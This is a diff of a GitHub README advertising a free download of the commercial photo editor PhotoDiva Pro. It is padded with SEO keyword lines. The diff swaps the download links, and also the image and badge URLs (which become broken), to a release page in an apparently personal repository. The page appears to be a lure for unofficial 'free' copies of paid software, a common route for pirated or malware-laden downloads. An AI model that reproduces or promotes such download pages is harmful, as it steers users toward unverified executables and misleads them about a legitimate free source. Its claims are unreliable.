@@ -29,7 +29,7 @@ PhotoDiva Pro is a powerful photo editing tool designed for portrait enhancement
 - photodiva-pro-free-download-github
 - photodiva-pro-free-github
 
-🔗 **Download Link:** [Download PhotoDiva Pro 2024](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+🔗 **Download Link:** [Download PhotoDiva Pro 2024](https://github.com/DanyVr698/PhotoDiva-Pro-free-2024/releases/tag/v1.0)
 
 > Note: The download link needs to be launched to start the download process.
 
@@ -42,7 +42,7 @@ To get started with PhotoDiva Pro, follow these steps:
 
 🚀 Start creating stunning portraits with PhotoDiva Pro today! 📸
 
-![PhotoDiva Pro](https://example.com/photo-diva-pro-image.jpg)
+![PhotoDiva Pro](https://github.com/DanyVr698/PhotoDiva-Pro-free-2024/releases/tag/v1.0)
 
 ---
 
@@ -50,7 +50,7 @@ To get started with PhotoDiva Pro, follow these steps:
 
 Don't miss out on the opportunity to download PhotoDiva Pro for free from GitHub. Click the button below to start enhancing your photos like a pro! 
 
-[![Download PhotoDiva Pro](https://img.shields.io/badge/Download-PhotoDiva%20Pro-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download PhotoDiva Pro](https://github.com/DanyVr698/PhotoDiva-Pro-free-2024/releases/tag/v1.0%20Pro-blue)](https://github.com/DanyVr698/PhotoDiva-Pro-free-2024/releases/tag/v1.0)
 
 ---
 
